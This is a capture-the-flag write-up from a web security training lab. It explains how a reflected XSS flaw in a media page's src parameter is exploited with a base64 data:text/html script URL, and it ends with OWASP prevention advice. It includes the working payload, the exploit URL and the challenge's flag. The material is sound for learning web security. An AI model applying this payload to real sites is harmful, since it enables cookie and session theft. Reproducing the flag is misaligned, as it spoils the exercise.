# XSS MEDIAS REQUEST

## Flag
```
928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
```

## Discovery
On the page http://{IP_ADDRESS}/

The NSA image (the one with headphone) leads to http://{IP_ADDRESS}/?page=media&src=nsa \
You can change nsa to base64 script
```diff
"data:text/html;base64," + base64("<script>alert("wtf");</script>")
> data:text/html;base64,PHNjcmlwdD5hbGVydCgid3RmIik7PC9zY3JpcHQ+
```
Finaly go to : \
http://{IP_ADDRESS}/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgid3RmIik7PC9zY3JpcHQ+ \
**This work because the request response accept text/html**

## Use
> the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site

## Prevention
> - never insert untrusted data except in allowed locations
> - HTML escape before inserting untrusted data into HTML element content
> - attribute escape before inserting untrusted data into HTML common attributes
> - javascript escape before inserting untrusted data into javascript data values
> - CSS escape and strictly validate before inserting untrusted data into HTML style property values
> - URL escape before inserting untrusted data into HTML URL parameter values
> - sanitize HTML markup with a library designed for the job
> - avoid javascript URL's

## Documentation
- [owasp - XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
- [owasp - prevent XSS breaches](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [base64](https://www.base64decode.org/)

---

[RETURN](https://github.com/tillderoquefeuil/darkly)